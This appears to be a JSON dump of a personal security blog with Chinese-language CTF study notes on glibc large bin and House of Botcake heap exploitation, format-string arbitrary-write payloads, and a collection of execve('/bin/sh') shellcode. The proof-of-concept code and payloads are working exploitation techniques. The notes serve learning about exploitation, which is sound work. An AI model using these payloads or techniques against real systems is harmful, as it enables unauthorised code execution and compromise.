{"meta":{"title":"A4x7eq28'Blog","subtitle":"","description":"","author":"A4x7eq28","url":"http://www.4x7.fun","root":"/"},"pages":[{"title":"书单","date":"2022-03-24T02:50:48.000Z","updated":"2022-03-24T02:50:48.000Z","comments":false,"path":"books/index.html","permalink":"http://www.4x7.fun/books/index.html","excerpt":"","text":""},{"title":"友情链接","date":"2022-03-24T02:51:21.000Z","updated":"2022-03-24T02:51:21.000Z","comments":true,"path":"links/index.html","permalink":"http://www.4x7.fun/links/index.html","excerpt":"","text":""},{"title":"tags","date":"2022-03-18T10:31:13.000Z","updated":"2022-03-18T11:07:53.000Z","comments":true,"path":"tags/index.html","permalink":"http://www.4x7.fun/tags/index.html","excerpt":"","text":""},{"title":"about","date":"2022-03-18T11:17:15.000Z","updated":"2022-03-18T11:50:55.000Z","comments":true,"path":"about/index.html","permalink":"http://www.4x7.fun/about/index.html","excerpt":"","text":""},{"title":"categories","date":"2022-03-18T10:31:12.000Z","updated":"2022-03-18T11:07:44.000Z","comments":true,"path":"categories/index.html","permalink":"http://www.4x7.fun/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"HeapAttack:LargeBinAttack","slug":"HeapAttack-LargeBinAttack","date":"2022-03-23T13:16:30.000Z","updated":"2022-03-23T13:16:30.000Z","comments":true,"path":"2022/03/23/HeapAttack-LargeBinAttack/","link":"","permalink":"http://www.4x7.fun/2022/03/23/HeapAttack-LargeBinAttack/","excerpt":"","text":"1. 漏洞样式 漏洞要求：Write After Free 内存大小：可申请 large bin(即size&gt;=0x400) 2. 利用方法 2.1 攻击效果 在unsorted-bin chunk被sort进large-bin时，触发***任意地址写***, 可以往***任意地址***中写入一个不可控的未知***大数*** (实际为***某堆地址***)。 实现以下目的： 修改循环次数 修改global_max_fast 或arena-&gt;max_fast的值，从而把size&gt;0x80的chunk分配到fastbin中;或者在目标二进制使用mallopt(M_MXFAST,0)禁用fastbin后，重新启用 修改能够输出的变量，从而泄露堆地址 2.2 过程简述 假设堆状态如下： unsorted-bin: A(0x400) large-bin: 0x400： B(0x410) 若 B 存在Write After Free, 则修改 B-&gt;bk_nextsize 为 目标地址(target) 。 触发A加入到large-bin链表中，则会导致 A-&gt;bk_nextsize = B-&gt;bk_nextsize; A-&gt;bk_nextsize-&gt;fd_nextsize = B 即 target-&gt;fd_nextsize = A 。 即 unsorted-bin: large-bin: 0x400: B(0x410) -&gt; A(0x400) [A插入时触发攻击] 2.3 代码表示 12345678910111213141516171819202122232425262728static uint64_t target; //假设需要被更改值的目标地址int attack()&#123; void* A, * B, * C; A = malloc(0x400 - 8); //A小 malloc(0x18); B = malloc(0x410 - 8); //B大 malloc(0x18); free(B); // unsortedbin: B // largebin: empty malloc(0x600); // unsortedbin: empty // largebin: 0x400: B(0x410) free(A)； // unsortedbin: A // largebin: 0x400: B(0x410) * ( uint64_t * )(B + 0x18) = ( uint64_t ) ( &amp;target ) - 0x20 //edit: B-&gt;bk_nextsize = target_over &amp;&amp; let: target_over-&gt;fd_nextsize = target malloc(0x600); // unsortedbin: empty // largebin: 0x400: B(0x410)-&gt;A(0x400) &#123;触发：A-&gt;bk_nextsize-&gt;fd_nextsize = A&#125;&#125; 3. 原理分析 在glibc项目malloc.c文件_int_malloc函数中： 在chunk被从unsortedbin中sort下来之后的代码部分 1234567891011121314151617181920212223242526272829303132333435363738. . . /* place chunk in bin */ //// 若smallbin范围 if (in_smallbin_range (size)) &#123; victim_index = smallbin_index (size); bck = bin_at (av, victim_index); fwd = bck-&gt;fd; &#125; else ////若在largebin范围 &#123; victim_index = largebin_index (size); bck = bin_at (av, victim_index); fwd = bck-&gt;fd; //// largebin:: [bck]: fwd /* maintain large bins in sorted order * / if (fwd != bck) //// largebin不为空 &#123; /* Or with inuse bit to speed comparisons */ size |= PREV_INUSE; /* if smaller than smallest, bypass loop below */ assert (chunk_main_arena (bck-&gt;bk)); if ((unsigned long) (size) &lt; (unsigned long) chunksize_nomask (bck-&gt;bk)) ////确认victim为最小，因此插入到链表最后 &#123; fwd = bck; bck = bck-&gt;bk; //// largebin:: [fwd]: bck //// 等同于2节例子中：[av]: B victim-&gt;fd_nextsize = fwd-&gt;fd; ////fwd-&gt;fd 即为bck,也就是例子里的B victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize; //// 因此victim-&gt;bk_nextsize = bck-&gt;bk_nextsize (即A-&gt;bk_nextsize = B-&gt;bk_nextsize) fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; ////即bck-&gt;bk_nextsize = bck-&gt;bk_nextsize-&gt;fd_nextsize = victim ////即例子：B-&gt;bk_nextsize = B-&gt;bk_nextsize-&gt;fd_nextsize = A ////==&gt; largebin attack的精髓即：B-&gt;bk_nextsize-&gt;fd_nextsize = A， ////==&gt; 而它通过两步计算得到：victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize; 和 victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; &#125; 参考 heap_exploit_2.31/largebin_attack.c","categories":[{"name":"HeapAttack","slug":"HeapAttack","permalink":"http://www.4x7.fun/categories/HeapAttack/"}],"tags":[{"name":"HeapAttack, LargeBinAttack, Arbitrary Write, Write After Free, waf","slug":"HeapAttack-LargeBinAttack-Arbitrary-Write-Write-After-Free-waf","permalink":"http://www.4x7.fun/tags/HeapAttack-LargeBinAttack-Arbitrary-Write-Write-After-Free-waf/"}]},{"title":"Shellcode Collection","slug":"shellcode","date":"2022-03-21T12:44:19.000Z","updated":"2022-03-21T12:44:19.000Z","comments":true,"path":"2022/03/21/shellcode/","link":"","permalink":"http://www.4x7.fun/2022/03/21/shellcode/","excerpt":"","text":"32位 有&quot;\\x00&quot;最短 20 byte 12345678910shellcode= &#x27;&#x27;&#x27; xor ecx,ecx mul ecx mov al,0xb push 0x68732f push 0x6e69622f mov ebx,esp int 0x80 &#x27;&#x27;&#x27; shellcode=asm(shellcode) 无&quot;\\x00&quot;最短 21 byte 12345678xor ecx,ecxmul ecxpush eaxmov al,0xbpush 0x68732f2f push 0x6e69622f mov ebx,espint 0x80 标准shellcode 23 byte 123456789xor ecx,ecxxor edx,edxpush edxpush 0x68732f2fpush 0x6e69622fmov ebx,espxor eax,eaxmov al,0xBint 0x80 64位 最短有&quot;\\x00&quot; 22 byte 12345678xor rsi,rsimul esimov rbx,0x68732f6e69622fpush rbxpush rsppop rdimov al, 59syscall 最短无&quot;\\x00&quot; 23 byte 123456789xor rsi,rsimul esipush raxmov rbx,0x68732f2f6e69622fpush rbxpush rsppop rdimov al, 59syscall 标准shellcode 31 byte 12345678910xor rdi,rdixor rsi,rsixor rdx,rdxxor rax,raxpush raxmov rbx,0x68732f2f6e69622fpush rbxmov rdi,rspmov al,0x3bsyscall 转载自: Linux_ShellCode","categories":[{"name":"shellcode","slug":"shellcode","permalink":"http://www.4x7.fun/categories/shellcode/"}],"tags":[{"name":"shellcode","slug":"shellcode","permalink":"http://www.4x7.fun/tags/shellcode/"}]},{"title":"HeapAttack:House_of_Botcake","slug":"HeapAttack-House-of-Botcake","date":"2022-03-18T12:16:10.000Z","updated":"2022-03-24T12:42:42.000Z","comments":true,"path":"2022/03/18/HeapAttack-House-of-Botcake/","link":"","permalink":"http://www.4x7.fun/2022/03/18/HeapAttack-House-of-Botcake/","excerpt":"","text":"1. 漏洞样式 glibc版本：≥ 2.3.1 Tcache：开启 漏洞要求：double free 2. 利用方法 2.1 攻击效果 绕过Tcache的 tcache-dup 检查，将 ‘可控chunk’ 插入’Tcache-list’,修改‘可控chunk’的***fd***字段，从而__最终实现__‘任意地址写’。 2.2 攻击过程 伪代码表示如下 123456789101112131415161718192021222324252627size = 0x108mem_lst = [ malloc(size) for x in range(7) ] #创建7个chunka = malloc(size) b = malloc(size) #a,b chunk是主角malloc(0x18) #和top_chunk隔离，防止forward-consolidation[free(x) for x in mem_lst] #把7个chunk free到tcache中,tcache被填满free(a) #因tcache已满，a、b进unsorted-binfree(b) #a、b邻接,因此发生consolidate合并成一个chunk在unsorted-bin中malloc(size) #一次分配后tcache有一个空位free(b) #对b使用double-free攻击。由于b不在tcache中，因此通过tcache检查被加入到tcache中。c = malloc(size + 0x30) #unsorted-bin发生remaindering，chunk-b的前0x30被memory-c overlappayload = size * b&quot;\\0&quot; + p64(size) + p64(target_address) #不同size时的payload写法不同；但目的是target_address覆盖到 b-&gt;fdwrite(c, payload) ##这里将target_address链接到tcache list中，下次对tcache size的内存请求即可分配到目标地址的内存chunktarget_memory = malloc(size)write(target_memory, arbitrary_value) 参考： heap_exploit_2.31/house_of_botcake.c","categories":[{"name":"HeapAttack, tcache","slug":"HeapAttack-tcache","permalink":"http://www.4x7.fun/categories/HeapAttack-tcache/"}],"tags":[{"name":"HeapAttack, House_of_Botcake, tcache","slug":"HeapAttack-House-of-Botcake-tcache","permalink":"http://www.4x7.fun/tags/HeapAttack-House-of-Botcake-tcache/"}]},{"title":"Format-String Attack","slug":"fmtstr_attack","date":"2022-03-18T03:42:27.000Z","updated":"2022-03-24T12:50:57.000Z","comments":true,"path":"2022/03/18/fmtstr_attack/","link":"","permalink":"http://www.4x7.fun/2022/03/18/fmtstr_attack/","excerpt":"","text":"1. 漏洞样式 通常情况下漏洞程序样式： Table 1. Vulnerable Code Demo 123char buffer[1024];gets(buffer, 1024);printf(buffer); 字符串 buffer 可控且作为 printf 的第一个参数。当其中包含 格式化字符(例如%s, %d, %p等) 时，栈上的内容就会被当做printf的第2个、第3个参数等被输出。 2. 利用方法 2.1 确定偏移 输入字符串（即Table 1中buffer）在栈上的偏移，即buffer被printf当做参数时，作为第几个参数。参数序号从0开始： printf(arg0, arg1, arg2, …, argn); 第10参数即表示arg10 步骤1. break printf ；即在 printf 下断点 步骤2. 输入 %p%p%p%p 等特殊字符 步骤3. 在 printf 函数断点，使用 stack 命令查看栈。找到 %p%p%p%p 特殊字符串在栈上的位置。如Figure 1所示。 Figure 1. printf stack illustration 需注意图中①断点在**printf**入口，已跳转到**printf** 但尚未执行**printf**中指令（尤其是栈指令，否则栈布局会改变）；注意图中② **0b** 即字符串 **%p%p%p%p** 距离栈顶( **esp** )的偏移为 **11**；由于在 **esp + 0** 的位置存放函数返回地址。因此 **%p%p%p%p** 字符串实际上位于 ***栈上*** 第 **10** 个参数。 - 步骤4. 根据不同架构确定 **buffer** 在 **printf** 函数参数的序号。参考[**函数调用约定**](https://www.laruence.com/2008/04/01/116.html)。 - a). x86架构 x86架构的函数参数全部通过栈传递， 因此 **buffer** 是 **printf** 的第**10**个参数。 - b). x64架构 x64传参顺序为rdi, rsi, rdx, rcx, r8, r9; 之后才使用栈传参。因此若 **Figure 1** 在x64架构中，**buffer**对应的是**printf**函数的第（0xb + 6 - 1)= 16 个参数(参数序号从0开始，0，1，2，..., 16)。 2.2 实现任意地址写 往 任意目标地址(记为target_address) 中写入 任意值(记为target_value) 。 1). 任意值的控制：通过格式化字符串 %Mc 其中 M=target_value来操控 2). 任意地址的控制：将目标地址(target_address)写入buffer字符串中；并通过格式化字符串 %N$n来指定将 当前printf已经输字符个数 写入到第 N 个参数指定的地址中。其中 N即为’使用2.1中方法确定的‘’在buffer字符串中的‘’target_address在栈上的位置对应的printf的参数序号‘。(该处使用’'分句停顿帮助阅读) 例如： 2.2.1 当target_value 较小时，直接写入 假如buffer字符串位于printf第10个参数的位置(即arg10、即printf栈0xb(10+1)参数位） Table 2. Payload Demo 1 12// 写4到target_addresspayload1 = p32(target_address) + b&#x27;%10$n\\0&#x27; 其中： payload1实现写4(p32为4byte)到target_address Table 3. Payload Demo 2 123payload2 = b&#x27;%13$n&#x27; + b&#x27;%100c&#x27; payload2 = payload2.ljust(12, b&#x27;a&#x27;)payload2 += p32(target_address) payload2实现写100到target_address, 此处由于target_adress没有写在字符串的开头，因此需要重新计算在栈上的偏移：字符串开头位于arg10处，字符串中target_address之前有12个字符即占3个参数位，因此target_address对应的参数位为13 2.2.2 当target_value太大时，分字节写入 假如buffer字符串位于printf第10个参数的位置(即arg10、即printf栈0xb(10+1)参数位）；且需要向target_address 中写入的target_value为***0xbaedbeef***。 实际上就是令： *(int8*)target_address = 0xef = 239 *(int8*)(target_address + 1) = 0xbe = 190 *(int8*)(target_address + 2) = 0xed = 237 *(int8*)(target_address + 3) = 0xba = 186 这种情况下使用 %Nhhn** 向目标地址写入**int8**宽度值 和 使用 **%Nhn 向目标地址写入int16宽度值，将会非常有用。 那么可以使用如下payload实现： Table 4. Payload Demo 3 12345678910111213payload = p32(target_address) //arg10payload += p32(target_address + 1) //arg11payload += p32(target_address + 2) //arg12payload += p32(target_address + 3) //arg13//已有16byte输出；写入时从小到大写；即186-&gt;190-&gt;237-&gt;239// 186 - 16 = 170payload += b&quot;%170c%13$hhn&quot;// 190 - 186 = 4payload += b&quot;%4c%11$hhn&quot;// 237 - 190 = 47payload += b&quot;%47c%12$hhn&quot;// 239 - 237 = 2payload += b&quot;%2c%10$hhn&quot; 2.2.3 使用pwnlib的fmtstr_payload函数自动构造payload 示例如下： Table 5. Payload Demo 4: fmtstr_payload 12345from pwn import *from pwnlib.util import misc//payload = fmtstr_payload(10, &#123;0x804c044: 0x1&#125;)payload = fmtstr_payload(10, &#123;target_address: target_value&#125;)io.send(payload) 2. 注意事项 3. 原理说明 参考： fmtstr_attack on ctf-wiki","categories":[{"name":"Format String","slug":"Format-String","permalink":"http://www.4x7.fun/categories/Format-String/"}],"tags":[{"name":"Format String","slug":"Format-String","permalink":"http://www.4x7.fun/tags/Format-String/"}]},{"title":"404","slug":"404","date":"2022-02-23T11:48:56.000Z","updated":"2022-03-24T12:50:00.000Z","comments":true,"path":"/404.html","link":"","permalink":"http://www.4x7.fun/404.html","excerpt":"","text":"Page Not Found","categories":[],"tags":[{"name":"404","slug":"404","permalink":"http://www.4x7.fun/tags/404/"}]}],"categories":[{"name":"HeapAttack","slug":"HeapAttack","permalink":"http://www.4x7.fun/categories/HeapAttack/"},{"name":"shellcode","slug":"shellcode","permalink":"http://www.4x7.fun/categories/shellcode/"},{"name":"HeapAttack, tcache","slug":"HeapAttack-tcache","permalink":"http://www.4x7.fun/categories/HeapAttack-tcache/"},{"name":"Format String","slug":"Format-String","permalink":"http://www.4x7.fun/categories/Format-String/"}],"tags":[{"name":"HeapAttack, LargeBinAttack, Arbitrary Write, Write After Free, waf","slug":"HeapAttack-LargeBinAttack-Arbitrary-Write-Write-After-Free-waf","permalink":"http://www.4x7.fun/tags/HeapAttack-LargeBinAttack-Arbitrary-Write-Write-After-Free-waf/"},{"name":"shellcode","slug":"shellcode","permalink":"http://www.4x7.fun/tags/shellcode/"},{"name":"HeapAttack, House_of_Botcake, tcache","slug":"HeapAttack-House-of-Botcake-tcache","permalink":"http://www.4x7.fun/tags/HeapAttack-House-of-Botcake-tcache/"},{"name":"Format String","slug":"Format-String","permalink":"http://www.4x7.fun/tags/Format-String/"},{"name":"404","slug":"404","permalink":"http://www.4x7.fun/tags/404/"}]}